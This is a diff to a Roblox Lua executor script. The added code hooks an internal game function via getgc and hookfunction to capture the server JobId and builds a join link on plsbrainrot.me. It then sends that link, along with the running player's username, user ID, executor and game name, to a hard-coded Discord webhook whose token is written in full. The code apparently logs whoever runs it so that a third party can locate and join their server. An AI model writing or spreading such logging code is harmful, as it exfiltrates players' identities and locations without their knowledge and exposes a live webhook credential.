@@ -33,19 +33,58 @@ local LP = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1528127806658314243/w5pbnsGbKICz17ETM9MPBiR8-rtDHeXPDb3RVQFlyq2MFhg4tAi-pRX0syUrVdILt_tz"
 
+-- Job ID capture with Delta executor bypass
+local bypassJobId = nil
+local capturedJobId = false
+local stepAnimate = nil
+local printed = false
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+    repeat
+        stepAnimate = nil
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+
+    local old
+    old = hookfunction(stepAnimate, function(dt)
+        if not printed then
+            printed = true
+            bypassJobId = game.JobId
+            capturedJobId = true
+        end
+        return old(dt)
+    end)
+    repeat task.wait() until capturedJobId and bypassJobId
+else
+    bypassJobId = game.JobId
+end
+
+local jobId = bypassJobId or game.JobId
+local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown"
 
 local webhookBody = HttpService:JSONEncode({
     embeds = {{
-        title = "shawarma zaml",
+        title = "flash zaml",
         color = 7864319,
         fields = {
             { name = "User",      value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = false },
             { name = "Executor",  value = executor,                               inline = false },
             { name = "Game Name", value = gameName,                               inline = false },
+            { name = "Join Link", value = joinLink,                               inline = false }
         },
-        footer = { text = "shawarma zaml" }
+        footer = { text = "flash zaml" }
     }}
 })
 
